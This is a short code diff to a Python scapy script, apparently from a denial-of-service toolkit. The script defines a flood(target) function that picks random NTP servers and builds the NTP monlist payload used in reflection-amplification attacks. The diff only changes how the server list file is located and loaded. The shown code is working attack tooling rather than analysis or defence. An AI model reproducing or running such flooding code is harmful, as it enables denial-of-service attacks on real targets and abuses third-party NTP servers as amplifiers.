@@ -3,9 +3,11 @@ import random
 from scapy.all import IP, send, Raw, UDP
 from socket import gaierror
 from colorama import Fore
+import os
 
 # Load NTP servers list
-with open("tools/L4/ntp_servers.txt", "r") as f:
+SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
+with open(os.path.join(SCRIPT_ROOT, "ntp_servers.txt"), "r") as f:
     ntp_servers = f.readlines()
 
 # Payload
@@ -13,7 +15,10 @@ payload = "\x17\x00\x03\x2a" + "\x00" * 4
 
 
 def flood(target):
-    server = random.choice(ntp_servers)
+    ntp_servers_path = os.path.join(SCRIPT_ROOT, 'ntp_servers.txt')
+    with open(ntp_servers_path, "r") as f:
+        servers = f.readlines()
+    server = random.choice(servers)
     # Packet
     packets = random.randint(10, 150)
     server = server.replace("\n", "")
